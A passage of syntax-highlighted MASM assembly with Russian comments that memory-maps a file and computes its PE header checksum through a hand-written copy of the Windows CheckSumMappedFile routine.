&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; GENERIC_READ<span style="color: #339933;">,</span>FILE_SHARE_WRITE<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>OPEN_EXISTING<span style="color: #339933;">,</span>FILE_ATTRIBUTE_NORMAL<span style="color: #339933;">,</span>NULL<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; hFile<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; CreateFileMapping<span style="color: #339933;">,</span>hFile<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>PAGE_READWRITE<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>NULL<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; hMapping<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; MapViewOfFile<span style="color: #339933;">,</span>hMapping<span style="color: #339933;">,</span>FILE_MAP_ALL_ACCESS<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; hMap<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; GetFileSize<span style="color: #339933;">,</span>hFile<span style="color: #339933;">,</span>NULL<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; offset CheckSum<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; offset HeaderSum<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; hMap<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; CheckSumMappedFile&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Вычисление контрольной суммы</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;после этого вызова в eax - окажется</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;контрольная сумма файла с именем Name1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; ExitProcess<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
<br/>
CheckSumMappedFile<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;код самой функции</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">fs</span><span style="color: #339933;">:</span>nothing<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: #46aa03; font-weight: bold;">fs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">00000000</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esp</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #339933;">-</span><span style="color: #ff0000;">00000001</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">7D6C61C0h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">7D6C4598h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: #46aa03; font-weight: bold;">fs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">00000000</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esp</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000010h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">18h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esp</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0Ch</span><span style="color: black;">&#93;</span> <span style="color: black; font-style: italic;">;размер файла</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shr</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">08h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; func0<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">1Ah</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">04h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">08h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">:</span>ptr IMAGE_DOS_HEADER<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>e_lfanew<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">20h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; saltito0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000001</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">18h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">20h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000000</span><br/>
<br/>
saltito0<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">04h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0FFFFFFFFh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">20h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">000000000h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; saltito1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">08h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">20h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; saltito1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">20h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000058h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000001h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">1Ah</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #339933;">-</span><span style="color: #ff0000;">00000001</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">1Ah</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">1Ah</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">02h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">1Ah</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #339933;">-</span><span style="color: #ff0000;">00000001</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">1Ah</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">1Ah</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
<br/>
saltito1<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movzx</span> &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">1Ah</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">14h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">20h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">-</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: #46aa03; font-weight: bold;">fs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">00000000</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebp</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span> &nbsp; &nbsp; <span style="color: #ff0000;">0010h</span><br/>
func0<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">08h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shl</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; func0_saltito0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000002</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; func0_saltito1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
